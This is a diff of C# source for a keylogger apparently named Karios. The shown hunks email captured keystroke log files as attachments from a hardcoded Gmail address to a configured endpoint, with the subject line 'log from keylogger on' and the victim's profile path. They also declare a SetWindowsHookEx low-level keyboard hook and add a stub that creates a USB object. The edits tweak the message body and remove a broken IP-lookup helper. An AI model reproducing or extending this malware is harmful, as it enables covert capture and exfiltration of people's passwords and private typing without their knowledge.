@@ -288,7 +288,7 @@ namespace Karios
                 mail.From = new MailAddress("GINGIRULES@gmail.com");
                 mail.To.Add(_emailEndpoint);
                 mail.Subject = "log from keylogger on " + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-                mail.Body = "New log file from Computer (" + GetIpAddress(Dns.GetHostName()) + " , finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
+                mail.Body = "New log file from Computer (, finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
                 var attachment = new Attachment(pathToLog);
                 mail.Attachments.Add(attachment);
                 /*
@@ -319,14 +319,6 @@ namespace Karios
                 EmailSending = false;
             }
         }
-        public static IPAddress GetIpAddress(string hostName)
-        {
-            //Currently Broken
-            var ping = new Ping();
-            var replay = ping.Send(hostName);
-            //Pings googles servers and gets hostname
-            return replay != null && replay.Status == IPStatus.Success ? replay.Address : null;
-        }
         static EventHandler LaunchWebsite()
         {
             using (var wc = new WebClient())
@@ -343,6 +335,15 @@ namespace Karios
                 return null;
             }
         }
+
+        public static void Testing()
+        {
+            var runUsb = new USB();
+        }
+
+
+
+
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
